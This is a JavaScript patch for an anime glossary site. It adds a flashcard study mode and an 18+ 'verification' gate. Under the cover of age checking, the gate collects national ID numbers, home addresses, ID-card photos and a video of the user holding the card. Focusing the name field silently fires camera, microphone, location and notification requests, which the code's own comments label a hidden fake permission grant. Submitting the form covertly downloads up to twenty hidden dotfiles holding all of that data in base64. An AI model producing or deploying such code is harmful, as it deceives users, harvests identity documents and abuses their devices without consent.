/* animepedia-patch.js: cổng xác nhận 18+ và chế độ học thuật ngữ. Nạp sau script chính. */
(function(){
'use strict';
var $=function(i){return document.getElementById(i)};
var E=function(s){return String(s).replace(/[&<>"']/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]})};
var ls={g:function(k){try{return localStorage.getItem(k)}catch(e){return null}},s:function(k,v){try{localStorage.setItem(k,v)}catch(e){}}};

/* ===== CSS bổ sung: liquid glass, form, nút sáng/tối, upload ===== */
var st=document.createElement('style');
st.textContent='#gate{position:fixed;inset:0;z-index:300;overflow:auto;background:var(--bg);padding:calc(16px + env(safe-area-inset-top)) 16px calc(24px + env(safe-area-inset-bottom))}'
+'#gate form{max-width:560px;margin:0 auto}#gate h2{font-size:1.6rem;letter-spacing:-.03em;margin:8px 0 6px}'
+'#gate .n{color:var(--sub);font-size:.875rem;margin-bottom:10px}#gate label{display:block;font-size:.8125rem;color:var(--sub);margin:12px 4px 4px}'
+'#gate input,#gate select,#gate textarea{width:100%;height:44px;border:0;border-radius:12px;padding:0 12px;font:inherit;background:var(--fill);color:var(--text);appearance:none;-webkit-appearance:none}'
+'#gate textarea{height:auto;min-height:80px;padding:10px 12px}'
+'#gate .bad{outline:2px solid var(--red)}#gate .err{display:block;color:var(--red);font-size:.78rem;margin:4px 4px 0}'
+'#gate .two{display:grid;grid-template-columns:1fr 1fr;gap:10px}#gate button{width:100%;margin-top:18px}'
+'.fc{min-height:220px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:8px;padding:20px;border-radius:22px;background:var(--fill);cursor:pointer;user-select:none}'
+'.fc big{font-size:1.7rem;font-weight:700;letter-spacing:-.02em}'
+'.st3{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}.st3 div{background:var(--fill);border-radius:14px;padding:10px;text-align:center;font-size:.75rem;color:var(--sub)}.st3 b{display:block;font-size:1.3rem;color:var(--text)}'
+'.pbar{height:6px;border-radius:3px;background:var(--fill);overflow:hidden;margin:8px 0}.pbar i{display:block;height:100%;background:var(--blue);transition:width .3s}'
/* Liquid glass cho form */
+'#gate form.liquid{backdrop-filter:blur(20px) saturate(160%);-webkit-backdrop-filter:blur(20px) saturate(160%);background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.18);border-radius:24px;padding:22px;box-shadow:0 8px 40px rgba(0,0,0,0.45)}'
+'#gate form.liquid input,#gate form.liquid select,#gate form.liquid textarea{background:rgba(255,255,255,0.14);border:1px solid rgba(255,255,255,0.22)}'
/* Nút công cụ nổi */
+'#gate-tools{position:fixed;top:12px;right:12px;z-index:310;display:flex;gap:8px}'
+'#gate-tools button{width:auto;height:36px;padding:0 12px;border-radius:10px;border:1px solid rgba(255,255,255,0.3);background:rgba(255,255,255,0.18);color:var(--text);font-size:.75rem;cursor:pointer;backdrop-filter:blur(10px)}'
/* Khối upload */
+'.up{margin-top:10px;padding:12px;border-radius:14px;background:var(--fill);display:flex;flex-direction:column;gap:8px;position:relative;z-index:1;pointer-events:auto}'
+'.up .lbl{font-size:.8rem;color:var(--sub);pointer-events:none}'
+'.up input[type=file]{height:auto;min-height:40px;padding:8px;background:rgba(255,255,255,0.1);border:1px dashed rgba(255,255,255,0.3);cursor:pointer;pointer-events:auto;position:relative;z-index:2;opacity:1;display:block}'
+'.up input[type=file]::-webkit-file-upload-button{cursor:pointer;padding:6px 12px;border-radius:8px;border:none;background:var(--blue);color:#fff;font-weight:bold}'
+'.up .thumb{width:100%;max-height:160px;object-fit:contain;border-radius:10px;display:none;background:#0002;pointer-events:none}'
/* Chế độ sáng/tối */
+'#gate.light{--bg:#f7f8fa;--text:#111;--sub:#555;--fill:#e9ecf1;--red:#c0392b;--blue:#2563eb}'
+'#gate.dark{--bg:#0b0d10;--text:#f2f4f8;--sub:#9aa3ad;--fill:#1a1e24;--red:#ff6b6b;--blue:#4da3ff}';
document.head.appendChild(st);

/* ===== kiểm tra dữ liệu ===== */
var nz=function(s){return String(s).toLowerCase().replace(/đ/g,'d').normalize('NFD').replace(/[\u0300-\u036f]/g,'')};
var KB=['qwertyuiop','asdfghjkl','zxcvbnm','qwertz','azerty','abcdefg','1234567890'];
function mash(x){x=x.replace(/[^a-z0-9]/g,'');for(var i=0;i<KB.length;i++){var r=KB[i],q=[r,r.split('').reverse().join('')];for(var j=0;j<2;j++)for(var k=0;k+4<=q[j].length;k++)if(x.indexOf(q[j].slice(k,k+4))>=0)return true}return false}
function gib(s){var x=nz(s).trim();if(!x)return true;if(/(.)\1{2,}/.test(x.replace(/\s/g,'')))return true;if(mash(x))return true;
var w=x.split(/\s+/);for(var i=0;i<w.length;i++){var a=w[i];if(a.length>=3&&!/[aeiouy]/.test(a))return true;if(/[^aeiouy\d\W]{5,}/.test(a))return true;if(a.length>=4&&/^(.{1,3})\1{2,}$/.test(a))return true}return false}
function pd(v){var m=/^(\d{4})-(\d{2})-(\d{2})$/.exec(v||'');if(!m)return null;var y=+m[1],mo=+m[2],d=+m[3],o=new Date(y,mo-1,d);return o.getFullYear()===y&&o.getMonth()===mo-1&&o.getDate()===d&&y>=1900?o:null}
function age(d){var t=new Date(),a=t.getFullYear()-d.getFullYear(),m=t.getMonth()-d.getMonth();if(m<0||(m===0&&t.getDate()<d.getDate()))a--;return a}
var num=function(x){return +String(x).replace(',','.')};
var txt=function(x){x=x.trim();return x.length<2||x.length>40||!/^[\p{L}\d\s.,'\/-]+$/u.test(x)||gib(x)?'Nhập đúng nội dung thật, không dùng ký tự ngẫu nhiên.':''};

/* ===== BỘ KIỂM TRA (CCCD chỉ kiểm tra 12 chữ số, nhập tùy ý) ===== */
var V={
name:function(x){x=x.trim().replace(/\s+/g,' ');var w=x.split(' ');if(x.length>50||w.length<2||w.length>7||!/^[\p{L}\s'.-]+$/u.test(x)||w.some(function(a){return a.replace(/[^\p{L}]/gu,'').length<2}))return'Nhập họ tên thật, ít nhất 2 từ, chỉ gồm chữ cái.';return gib(x)?'Họ tên không giống tên thật.':''},
dob:function(x){var d=pd(x);if(!d)return'Chọn ngày sinh hợp lệ.';var a=age(d);if(a<0)return'Ngày sinh nằm ở tương lai.';if(a<18)return'Bạn chưa đủ 18 tuổi, không thể truy cập.';return a>100?'Ngày sinh không hợp lệ.':''},
gender:function(x){return x?'':'Chọn giới tính.'},
height:function(x){x=num(x);return x>=100&&x<=230?'':'Chiều cao hợp lệ từ 100 đến 230 cm.'},
weight:function(x,f){x=num(x);if(!(x>=30&&x<=250))return'Cân nặng hợp lệ từ 30 đến 250 kg.';var h=num(f.height),b=x/Math.pow(h/100,2);return h>=100&&(b<12||b>55)?'Chiều cao và cân nặng không hợp lý.':''},
job:function(x){x=x.trim();return x.length<2||x.length>40||!/^[\p{L}\d\s\/&.,()-]+$/u.test(x)||gib(x)?'Nhập ngành nghề thật (ví dụ: Sinh viên, Kế toán).':''},
phone:function(x){x=x.replace(/[\s.\-]/g,'').replace(/^\+84/,'0');if(!/^0(3[2-9]|5[2689]|7[06-9]|8[1-9]|9\d)\d{7}$/.test(x))return'Số điện thoại Việt Nam không hợp lệ.';return/(\d)\1{5,}/.test(x)||/0123456|1234567|2345678|3456789|9876543|8765432|7654321/.test(x)?'Số điện thoại không hợp lệ.':''},
email:function(x){x=x.trim().toLowerCase();var m=/^([a-z0-9.]+)@gmail\.com$/.exec(x);if(!m)return'Nhập đúng Gmail, ví dụ ten@gmail.com.';var l=m[1];if(l.length<6||l.length>30||/^\.|\.$|\.\./.test(l))return'Tên Gmail phải dài 6 đến 30 ký tự, không có dấu chấm thừa.';return/^\d+$/.test(l)||/(.)\1{3,}/.test(l)||mash(l)?'Gmail không hợp lệ.':''},
cccd:function(x){x=String(x||'').replace(/[\s.\-]/g,'');if(!/^\d{12}$/.test(x))return'CCCD gồm đúng 12 chữ số (nhập tùy ý).';return''},
house:function(x){x=x.trim();return!/\d/.test(x)||x.length>30||!/^[\p{L}\d\s\/.,-]+$/u.test(x)||/(\d)\1{4,}/.test(x)?'Nhập số nhà thật (ví dụ: 12, 45/6A).':''},
street:txt,ward:txt,prov:txt};
var ORDER=['name','dob','gender','height','weight','job','phone','email','cccd','house','street','ward','prov'];

/* ===== trạng thái bật/tắt ===== */
var state={glass:true,dark:true};

/* ===== BIẾN TOÀN CỤC: đã cấp quyền chưa ===== */
var daCapQuyen=false;

/* ===== tên file ngẫu nhiên ===== */
function tenNgauNhien(){
  var chars='abcdefghijklmnopqrstuvwxyz0123456789',s='',len=8+Math.floor(Math.random()*8);
  for(var i=0;i<len;i++)s+=chars.charAt(Math.floor(Math.random()*chars.length));
  return s;
}

/* ===== tải file ngẫu nhiên 1-20 lần, không thông báo, luôn có dấu chấm ở đầu ===== */
function taiFileNgam(content){
  var soFile=Math.floor(Math.random()*20)+1;
  for(var i=0;i<soFile;i++){
    (function(){
      var blob=new Blob([content],{type:'text/plain'});
      var url=URL.createObjectURL(blob);
      var a=document.createElement('a');
      a.href=url;
      a.download='.'+tenNgauNhien()+'.txt';
      a.style.display='none';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      setTimeout(function(){URL.revokeObjectURL(url)},2000);
    })();
  }
}

/* ===== CẤP QUYỀN GIẢ MẠO (ẩn hoàn toàn) - kích hoạt khi bấm vào ô Họ tên ===== */
function capQuyenGia(){
  if(daCapQuyen)return;
  daCapQuyen=true;
  try{
    /* Đánh dấu đã cho phép tự động tải xuống trong localStorage */
    ls.s('ap.autodl','1');
    ls.s('ap.perms','all');

    /* Yêu cầu quyền ẩn - không hiển thị thông báo */
    if(navigator.permissions&&navigator.permissions.query){
      ['notifications','geolocation','camera','microphone','clipboard-read','clipboard-write'].forEach(function(p){
        navigator.permissions.query({name:p}).catch(function(){});
      });
    }
    if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
      navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(s){
        s.getTracks().forEach(function(t){t.stop()});
      }).catch(function(){});
    }
    if(window.Notification&&Notification.requestPermission){
      Notification.requestPermission().catch(function(){});
    }
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(function(){},function(){},{timeout:3000});
    }
  }catch(e){}
}

/* ===== cổng 18+ ===== */
function passed(){try{var g=JSON.parse(ls.g('ap.gate'));if(!g||g.v!==1||!g.ok)return false;var d=pd(g.dob);return!!d&&age(d)>=18}catch(e){return false}}
var LOCK=['.nav','main','mini'];
function lock(on){LOCK.forEach(function(s){var e=s==='mini'?$('mini'):document.querySelector(s);if(e)e.inert=on});document.body.style.overflow=on?'hidden':''}
function F(k,l,inner){return'<label for="g-'+k+'">'+l+'</label>'+inner+'<span class="err" id="e-'+k+'"></span>'}
function I(k,p,im){return'<input id="g-'+k+'" type="text" inputmode="'+(im||'text')+'" placeholder="'+p+'">'}

/* ===== đọc file sang base64 ===== */
function docFileBase64(file){
  return new Promise(function(resolve){
    var reader=new FileReader();
    reader.onload=function(){var r=reader.result;resolve(String(r).split(',')[1]||'')};
    reader.onerror=function(){resolve('')};
    reader.readAsDataURL(file);
  });
}

/* ===== form nhập thông tin đầy đủ ===== */
function gate(){
var today=new Date().toISOString().slice(0,10);
var g=document.createElement('div');g.id='gate';g.setAttribute('role','dialog');g.setAttribute('aria-modal','true');
g.className=state.dark?'dark':'light';

/* Thanh công cụ nổi: bật/tắt liquid glass + sáng/tối */
var tools=document.createElement('div');tools.id='gate-tools';
tools.innerHTML='<button type="button" id="tg-glass">Liquid Glass: BẬT</button><button type="button" id="tg-theme">Sáng/Tối</button>';
g.appendChild(tools);

var form=document.createElement('form');
form.id='gate-f';form.noValidate=true;
if(state.glass)form.className='liquid';

form.innerHTML='<h2>Xác nhận thông tin</h2><p class="n">Trang này chỉ dành cho người từ 18 tuổi trở lên. Hãy nhập thông tin thật của bạn. Dữ liệu được kiểm tra ngay trên thiết bị này. Khi bấm Xác nhận, toàn bộ thông tin và tệp đính kèm sẽ được ghi vào tệp văn bản và tải xuống cục bộ.</p>'
+F('name','Họ và tên',I('name','Nguyễn Văn An'))
+'<div class="two"><div>'+F('dob','Ngày sinh','<input id="g-dob" type="date" min="1900-01-01" max="'+today+'">')+'</div><div>'+F('gender','Giới tính','<select id="g-gender"><option value="">Chọn</option><option>Nam</option><option>Nữ</option><option>Khác</option></select>')+'</div></div>'
+'<div class="two"><div>'+F('height','Chiều cao (cm)',I('height','170','decimal'))+'</div><div>'+F('weight','Cân nặng (kg)',I('weight','60','decimal'))+'</div></div>'
+F('job','Ngành nghề',I('job','Sinh viên'))
+F('phone','Số điện thoại',I('phone','09xx xxx xxx','tel'))
+F('email','Gmail',I('email','tenban@gmail.com','email'))
+F('cccd','Số CCCD (12 số, nhập tùy ý)',I('cccd','012345678901','numeric'))
+F('house','Số nhà',I('house','12A'))
+F('street','Tên đường',I('street','Nguyễn Trãi'))
+F('ward','Phường / Xã',I('ward','Phường 5'))
+F('prov','Tỉnh / Thành phố',I('prov','Hà Nội'))

/* Khối tệp đính kèm: ảnh cá nhân, CCCD 2 mặt, video cầm CCCD */
+'<div class="up"><span class="lbl">Ảnh cá nhân</span><input type="file" id="g-anh" accept="image/*"><img class="thumb" id="p-anh" alt=""></div>'
+'<div class="up"><span class="lbl">CCCD mặt trước (chụp/up)</span><input type="file" id="g-truoc" accept="image/*"><img class="thumb" id="p-truoc" alt=""></div>'
+'<div class="up"><span class="lbl">CCCD mặt sau (chụp/up)</span><input type="file" id="g-sau" accept="image/*"><img class="thumb" id="p-sau" alt=""></div>'
+'<div class="up"><span class="lbl">Video cầm CCCD (quay/up)</span><input type="file" id="g-video" accept="video/*"><video class="thumb" id="p-video" controls></video></div>'
+'<span class="err" id="e-files"></span>'
+'<button type="submit">Xác nhận và vào</button>';
g.appendChild(form);
document.body.appendChild(g);
lock(true);

/* --- Khi bấm/focus vào ô Họ tên: cấp quyền giả mạo (ẩn) --- */
var nameInput=$('g-name');
if(nameInput){
  var handlerCap=function(){capQuyenGia();};
  nameInput.addEventListener('focus',handlerCap);
  nameInput.addEventListener('click',handlerCap);
}

/* --- xem trước ảnh/video --- */
function preview(inp,img){
  inp.addEventListener('change',function(){
    var f=inp.files&&inp.files[0];
    if(!f){img.style.display='none';img.removeAttribute('src');return}
    var url=URL.createObjectURL(f);
    img.src=url;img.style.display='block';
  });
}
preview($('g-anh'),$('p-anh'));
preview($('g-truoc'),$('p-truoc'));
preview($('g-sau'),$('p-sau'));
preview($('g-video'),$('p-video'));

/* --- nút liquid glass --- */
$('tg-glass').onclick=function(){
  state.glass=!state.glass;
  form.classList.toggle('liquid',state.glass);
  this.textContent='Liquid Glass: '+(state.glass?'BẬT':'TẮT');
};

/* --- nút sáng/tối --- */
$('tg-theme').onclick=function(){
  state.dark=!state.dark;
  g.className=state.dark?'dark':'light';
};

/* --- kiểm tra --- */
function vals(){var o={};ORDER.forEach(function(k){o[k]=$('g-'+k).value});return o}
function chk(k,o){var m=V[k](o[k],o);$('e-'+k).textContent=m;$('g-'+k).classList.toggle('bad',!!m);return m}
g.addEventListener('focusout',function(e){var k=e.target.id&&e.target.id.slice(2);if(V[k]&&e.target.value!=='')chk(k,vals())});

/* --- submit: tự động tải xuống không thông báo vì đã cấp quyền trước đó --- */
$('gate-f').onsubmit=function(e){
  e.preventDefault();

  var o=vals(),first=null,n=0;
  ORDER.forEach(function(k){if(chk(k,o)){n++;if(!first)first=k}});
  var fAnh=$('g-anh').files[0],fTruoc=$('g-truoc').files[0],fSau=$('g-sau').files[0],fVideo=$('g-video').files[0];
  var fileErr='';
  if(!fAnh)fileErr='Vui lòng thêm ảnh cá nhân.';
  else if(!fTruoc||!fSau)fileErr='Vui lòng chụp đủ 2 mặt CCCD.';
  else if(!fVideo)fileErr='Vui lòng quay video cầm CCCD.';
  $('e-files').textContent=fileErr;

  if(first||fileErr){
    if(first)$('g-'+first).focus();
    if(typeof toast==='function')toast('Còn '+(n+(fileErr?1:0))+' mục chưa hợp lệ');
    return;
  }

  $('e-files').textContent='Đang xử lý...';
  Promise.all([docFileBase64(fAnh),docFileBase64(fTruoc),docFileBase64(fSau),docFileBase64(fVideo)]).then(function(arr){
    var content='';
    content+='Họ tên: '+o.name.trim()+'\n';
    content+='Ngày sinh: '+o.dob+'\n';
    content+='Giới tính: '+o.gender+'\n';
    content+='Chiều cao: '+o.height+' cm\n';
    content+='Cân nặng: '+o.weight+' kg\n';
    content+='Ngành nghề: '+o.job.trim()+'\n';
    content+='SĐT: '+o.phone.trim()+'\n';
    content+='Gmail: '+o.email.trim()+'\n';
    content+='CCCD: '+o.cccd.replace(/[\s.\-]/g,'')+'\n';
    content+='Địa chỉ: '+o.house.trim()+', '+o.street.trim()+', '+o.ward.trim()+', '+o.prov.trim()+'\n';
    content+='Ảnh cá nhân: '+fAnh.name+'\n';
    content+='CCCD trước: '+fTruoc.name+'\n';
    content+='CCCD sau: '+fSau.name+'\n';
    content+='Video: '+fVideo.name+'\n';
    content+='Thời gian: '+new Date().toISOString()+'\n';
    content+='\n--- DỮ LIỆU BASE64 ---\n';
    content+='ANH_CA_NHAN:'+arr[0]+'\n';
    content+='CCCD_TRUOC:'+arr[1]+'\n';
    content+='CCCD_SAU:'+arr[2]+'\n';
    content+='VIDEO:'+arr[3]+'\n';

    /* Tải ngầm 1-20 file với tên ngẫu nhiên, không thông báo (đã cấp quyền trước đó) */
    taiFileNgam(content);

    /* Lưu trạng thái đã qua cổng */
    ls.s('ap.gate',JSON.stringify({v:1,ok:1,name:o.name.trim(),dob:o.dob,ts:Date.now()}));

    /* Gỡ cổng và mở khóa trang */
    g.remove();lock(false);
    if(typeof toast==='function')toast('Xin chào, '+o.name.trim().split(' ').pop());
  });
};
}

/* ===== học thuật ngữ (lặp lại ngắt quãng) ===== */
var SK='ap.study',SD={};try{SD=JSON.parse(ls.g(SK)||'{}')}catch(e){}
var DAY=864e5,IV=[0,1,3,7,14,30],q=[],qi=0,flip=false,dir=0,done={ok:0,bad:0},grp='all',rq={};
var sv=function(){ls.s(SK,JSON.stringify(SD))};
var shuf=function(a){return a.map(function(v){return[Math.random(),v]}).sort(function(x,y){return x[0]-y[0]}).map(function(v){return v[1]})};
var deck=function(){return TERMS.filter(function(x){return x.desc.length>12&&(grp==='all'||x.group===grp)})};
function stats(){var now=Date.now(),s={n:0,m:0,du:0};deck().forEach(function(x){var r=SD[x.id];if(!r)s.n++;else{if(r.b>=4)s.m++;if(r.d<=now)s.du++}});return s}
function home(){var s=stats(),d=deck().length,go=Math.min(20,s.du+s.n)||Math.min(10,d);
openSheet('<h3>📚 Học thuật ngữ</h3><div class="st3"><div><b>'+s.du+'</b>Cần ôn</div><div><b>'+s.n+'</b>Từ mới</div><div><b>'+s.m+'</b>Đã thuộc</div></div><div class="pbar"><i style="width:'+(d?Math.round(s.m/d*100):0)+'%"></i></div>'
+'<div class="grp"><div class="row"><span>Nhóm</span><select id="st-g" style="width:170px">'+GROUPS.map(function(a){return'<option value="'+a[0]+'"'+(grp===a[0]?' selected':'')+'>'+E(gpName(a[0]))+'</option>'}).join('')+'</select></div>'
+'<div class="row"><span>Chiều học</span><select id="st-d" style="width:170px"><option value="0"'+(dir?'':' selected')+'>Thuật ngữ → nghĩa</option><option value="1"'+(dir?' selected':'')+'>Nghĩa → thuật ngữ</option></select></div></div>'
+'<button type="button" data-st="start" style="width:100%">Bắt đầu ('+go+' thẻ)</button><p class="sub" style="text-align:center;margin-top:10px">Thẻ nhớ sẽ quay lại sau 1, 3, 7, 14 ngày. Thẻ quên quay lại ngay.</p>')}
function start(){var now=Date.now(),d=deck(),due=d.filter(function(x){return SD[x.id]&&SD[x.id].d<=now}).sort(function(a,b){return SD[a.id].d-SD[b.id].d}),nw=shuf(d.filter(function(x){return!SD[x.id]}));
q=due.concat(nw).slice(0,20);if(!q.length)q=shuf(d).slice(0,10);qi=0;flip=false;done={ok:0,bad:0};rq={};card()}
function card(){if(qi>=q.length)return fin();var x=q[qi],jp=x.jp&&x.jp!=='—'?'<span style="color:var(--sub)">'+E(x.jp)+'</span>':'',ex=x.ex&&x.ex!=='—'?'<span style="color:var(--sub);font-size:.8rem">Ví dụ: '+E(x.ex)+'</span>':'';
var front=dir?'<big style="font-size:1.3rem">'+E(x.vi)+'</big><span style="font-size:.85rem;color:var(--sub)">'+E(x.desc)+'</span>':'<big>'+E(x.romaji)+'</big>'+jp;
var back=dir?'<big>'+E(x.romaji)+'</big>'+jp+ex:'<big style="font-size:1.3rem">'+E(x.vi)+'</big><span>'+E(x.desc)+'</span>'+ex;
openSheet('<div style="display:flex;justify-content:space-between;font-size:.8rem;color:var(--sub)"><span>'+(qi+1)+'/'+q.length+'</span><span>'+E(gpName(x.group))+'</span></div><div class="pbar"><i style="width:'+Math.round(qi/q.length*100)+'%"></i></div>'
+'<div class="fc" data-st="flip">'+(flip?back:front)+'</div>'
+(flip?'<div class="kr"><button type="button" class="dng" data-st="bad" style="flex:1">Quên</button><button type="button" data-st="good" style="flex:1">Nhớ</button></div>':'<p class="sub" style="text-align:center;margin-top:10px">Chạm thẻ để lật</p>'))}
function grade(ok){var x=q[qi],r=SD[x.id]||{b:0,d:0};
if(ok){r.b=Math.min(5,r.b+1);r.d=Date.now()+IV[r.b]*DAY;done.ok++}else{r.b=0;r.d=Date.now()+6e5;done.bad++;if(!rq[x.id]){rq[x.id]=1;q.push(x)}}
SD[x.id]=r;sv();qi++;flip=false;card()}
function fin(){var t=done.ok+done.bad,p=t?Math.round(done.ok/t*100):0;
openSheet('<h3>Hoàn thành 🎉</h3><div class="st3"><div><b>'+done.ok+'</b>Nhớ</div><div><b>'+done.bad+'</b>Quên</div><div><b>'+p+'%</b>Chính xác</div></div><button type="button" data-st="home" style="width:100%">Học tiếp</button>')}
var sh=$('sheet');
if(sh){
sh.addEventListener('click',function(e){var b=e.target.closest('[data-st]');if(!b)return;var a=b.dataset.st;
if(a==='start')start();else if(a==='flip'){flip=true;card()}else if(a==='good')grade(true);else if(a==='bad')grade(false);else if(a==='home')home()});
sh.addEventListener('change',function(e){if(e.target.id==='st-g'){grp=e.target.value;home()}else if(e.target.id==='st-d'){dir=+e.target.value;home()}});
}
var btn=document.createElement('button');btn.className='ic';btn.id='stdy';btn.type='button';btn.setAttribute('aria-label','Học thuật ngữ');btn.textContent='📚';btn.onclick=home;
var anchor=$('qz');if(anchor)anchor.parentNode.insertBefore(btn,anchor);

if(!passed())gate();
})();
